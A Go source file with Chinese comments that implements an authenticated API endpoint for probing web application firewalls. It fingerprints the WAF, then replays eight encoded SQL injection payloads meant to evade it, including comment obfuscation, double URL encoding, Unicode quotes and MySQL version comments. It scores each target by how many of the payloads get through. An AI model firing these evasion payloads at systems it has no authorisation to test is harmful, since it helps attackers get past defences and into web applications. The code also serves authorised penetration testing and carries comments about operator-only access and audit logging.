// waf_bypass_probe.go 是「WAF 绕过预筛」的人工操作 API：
// 先发一条基线请求拿原始响应，从响应头/体识别 WAF；再把同一条 SQL 注入
// 意图用 8 种编码/变形逐条重放，比较基线与变体的状态码和拦截页，给出
// bypassable / hard / skip 结论、0-100 评分与逐条证据。
//
// 挂在 /api 下 requireAuth 之后（JWT）：只允许已登录操作者手动触发；
// 不进入 agent 工具面，避免模型自行对未授权目标发起探测。每次调用都会写
// 一条 [waf-probe] 审计日志（目标 / 结论 / 评分 / 识别到的 WAF）。
package server

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// WAFProbeResult 是 WAF 绕过探测的结论。
type WAFProbeResult struct {
	Target       string   `json:"target"`
	WAFDetected  string   `json:"waf_detected"`  // 识别到的 WAF 名，空=未识别
	Bypassable   bool     `json:"bypassable"`    // 至少一种变体能穿
	BypassMethod string   `json:"bypass_method"` // 穿过去的变体描述
	Score        int      `json:"score"`         // 0-100，越高越值得打
	Verdict      string   `json:"verdict"`       // "bypassable" | "hard" | "skip"
	Evidence     []string `json:"evidence"`      // 命中的具体证据
	Error        string   `json:"error,omitempty"`
}

// normalizeTargetURL 把用户输入归一化成可请求的 http(s) URL：
// 缺 scheme 时补 http://，拒绝空目标、无主机名和非 http(s) scheme。
func normalizeTargetURL(raw string) (*url.URL, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return nil, fmt.Errorf("目标为空")
	}
	if !strings.Contains(raw, "://") {
		raw = "http://" + raw
	}
	u, err := url.Parse(raw)
	if err != nil {
		return nil, fmt.Errorf("非法目标 URL: %w", err)
	}
	if u.Host == "" {
		return nil, fmt.Errorf("非法目标 URL: 缺少主机名")
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return nil, fmt.Errorf("仅支持 http/https: %s", u.Scheme)
	}
	return u, nil
}

// WAFProbe 对目标做 WAF 识别 + 变体绕过实测。
// 核心：同一个恶意意图，用不同编码/变形发送，看哪些能穿。
func WAFProbe(ctx context.Context, rawURL string, timeout time.Duration) WAFProbeResult {
	res := WAFProbeResult{Target: rawURL}
	if timeout <= 0 {
		timeout = 20 * time.Second
	}
	u, err := normalizeTargetURL(rawURL)
	if err != nil {
		res.Error = err.Error()
		res.Verdict = "skip"
		return res
	}

	client := &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			DialContext:     (&net.Dialer{Timeout: timeout}).DialContext,
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// 1. 基线：发一个正常请求，拿原始响应
	baseline, baseStatus, baseBody := wafProbeOnce(ctx, client, u, timeout)
	if baseline == "" {
		res.Error = "基线请求失败"
		res.Verdict = "skip"
		return res
	}

	// 2. WAF 识别（从基线响应头/体）
	res.WAFDetected = detectWAFFromResponse(baseline, baseBody)

	// 3. 构造“恶意意图”变体，逐个测
	//    同一条注入意图，用不同编码发送，看 WAF 是否放行
	payloads := []struct {
		name   string
		query  string
		method string // 绕过策略描述
	}{
		{"plain_sqli", "id=1'%20OR%20'1'='1", "明文注入"},
		{"comment_obfuscated", "id=1'/**/OR/**/'1'='1", "注释混淆"},
		{"case_random", "id=1'%20oR%20'1'='1", "大小写随机"},
		{"url_double_encode", "id=1%2527%2520OR%2520%25271%2527%253D%25271", "双重URL编码"},
		{"unicode_quote", "id=1%EF%BC%87%20OR%20%EF%BC%871%EF%BC%87%3D%EF%BC%871", "Unicode引号"},
		{"inline_version", "id=1'/*!50000OR*/'1'='1", "MySQL版本注释"},
		{"newline_split", "id=1'%0AOR%0A'1'='1", "换行分割"},
		{"tab_split", "id=1'%09OR%09'1'='1", "Tab分割"},
	}

	bypassCount := 0
	var bypassMethods []string

	for _, p := range payloads {
		probeURL := *u
		if strings.Contains(probeURL.RawQuery, "=") {
			probeURL.RawQuery = probeURL.RawQuery + "&" + p.query
		} else {
			probeURL.RawQuery = p.query
		}

		body, status, respBody := wafProbeOnce(ctx, client, &probeURL, timeout)
		if body == "" {
			continue
		}

		// 判断：这个变体是否被 WAF 拦截？
		blocked := isWAFBlocked(status, respBody, res.WAFDetected)

		switch {
		case blocked:
			res.Evidence = append(res.Evidence,
				fmt.Sprintf("变体 %s（%s）被拦截（状态码 %d）", p.name, p.method, status))
		case status == http.StatusNotFound && status != baseStatus:
			// 404 视为端点不存在，不算穿
			res.Evidence = append(res.Evidence,
				fmt.Sprintf("变体 %s（%s）返回 404，端点不存在，不计入绕过", p.name, p.method))
		case status != baseStatus:
			// 未被拦截且状态码有变化 → 可能穿了
			bypassCount++
			bypassMethods = append(bypassMethods, fmt.Sprintf("%s (%s) → %d", p.name, p.method, status))
			res.Evidence = append(res.Evidence,
				fmt.Sprintf("变体 %s（%s）未被拦截，状态码 %d", p.name, p.method, status))
		default:
			// 未被拦截但状态码相同——可能穿了但应用没反应，也记证据
			res.Evidence = append(res.Evidence,
				fmt.Sprintf("变体 %s（%s）放行（状态码 %d，与基线相同）", p.name, p.method, status))
		}
	}

	// 4. 判定
	if bypassCount > 0 {
		res.Bypassable = true
		res.BypassMethod = strings.Join(bypassMethods, "; ")
		res.Score = 50 + bypassCount*10
		if res.Score > 100 {
			res.Score = 100
		}
		res.Verdict = "bypassable"
	} else if res.WAFDetected != "" {
		res.Score = 10
		res.Verdict = "hard"
	} else {
		// 没 WAF 但变体全没穿——可能目标本身不解析这些参数，或应用层拒绝
		res.Score = 20
		res.Verdict = "skip"
	}

	return res
}

// wafProbeOnce 发一个请求，返回原始响应头、状态码、响应体（小写）。
func wafProbeOnce(ctx context.Context, client *http.Client, u *url.URL, timeout time.Duration) (string, int, string) {
	reqCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	method := http.MethodGet
	req, err := http.NewRequestWithContext(reqCtx, method, u.String(), nil)
	if err != nil {
		return "", 0, ""
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")

	resp, err := client.Do(req)
	if err != nil {
		return "", 0, ""
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 32*1024))
	raw := fmt.Sprintf("%s %s\n", resp.Proto, resp.Status)
	for k, vs := range resp.Header {
		for _, v := range vs {
			raw += fmt.Sprintf("%s: %s\n", k, v)
		}
	}
	return raw, resp.StatusCode, strings.ToLower(string(body))
}

// isWAFBlocked 判断一个响应是否被 WAF 拦截。
func isWAFBlocked(status int, body string, wafName string) bool {
	// 状态码特征
	switch status {
	case 403, 406, 412, 429, 503:
		return true
	}
	// 响应体特征
	blockPatterns := []string{
		"access denied", "request blocked", "security policy",
		"web application firewall", "mod_security", "cloudflare",
		"attention required", "sucuri website firewall", "请求被拦截",
		"安全策略", "访问被拒绝",
	}
	for _, p := range blockPatterns {
		if strings.Contains(body, p) {
			return true
		}
	}
	// 如果识别了 WAF 且状态码是 200 但响应体很短（典型拦截页）
	if wafName != "" && status == 200 && len(body) < 500 {
		shortBlockPatterns := []string{"blocked", "denied", "forbidden", "error"}
		for _, p := range shortBlockPatterns {
			if strings.Contains(body, p) {
				return true
			}
		}
	}
	return false
}

// detectWAFFromResponse 从响应头/体识别 WAF。
func detectWAFFromResponse(rawHeaders, body string) string {
	rawLower := strings.ToLower(rawHeaders)
	// 头部特征
	headerSigs := map[string]string{
		"cf-ray":         "cloudflare",
		"x-sucuri-id":    "sucuri",
		"x-akamai":       "akamai",
		"x-cdn":          "generic-cdn",
		"server: awselb": "aws-elb",
	}
	for sig, name := range headerSigs {
		if strings.Contains(rawLower, sig) {
			return name
		}
	}
	// 体特征
	bodySigs := map[string]string{
		"cloudflare":    "cloudflare",
		"sucuri":        "sucuri",
		"mod_security":  "modsecurity",
		"incapsula":     "imperva",
		"barracuda":     "barracuda",
		"fortiweb":      "fortinet",
		"请求被拦截":         "generic-waf",
		"access denied": "generic-waf",
	}
	for sig, name := range bodySigs {
		if strings.Contains(body, sig) {
			return name
		}
	}
	return ""
}

// wafBypassProbe 是 POST /api/waf-probe 的 HTTP 入口。
// 请求体：{"target":"https://example.com/item?id=1","timeout_seconds":20}
// 响应：WAFProbeResult（verdict=bypassable/hard/skip）。
func (s *Server) wafBypassProbe(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Target         string `json:"target"`
		TimeoutSeconds int    `json:"timeout_seconds"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	timeout := time.Duration(req.TimeoutSeconds) * time.Second
	if req.TimeoutSeconds <= 0 {
		timeout = 20 * time.Second
	}
	// 单次连接超时上限 60s：变体逐条串行发送，避免一个请求把 handler 挂太久。
	if timeout > 60*time.Second {
		timeout = 60 * time.Second
	}
	res := WAFProbe(r.Context(), req.Target, timeout)
	log.Printf("[waf-probe] target=%s verdict=%s score=%d waf=%q bypassable=%t",
		res.Target, res.Verdict, res.Score, res.WAFDetected, res.Bypassable)
	writeJSON(w, 200, res)
}
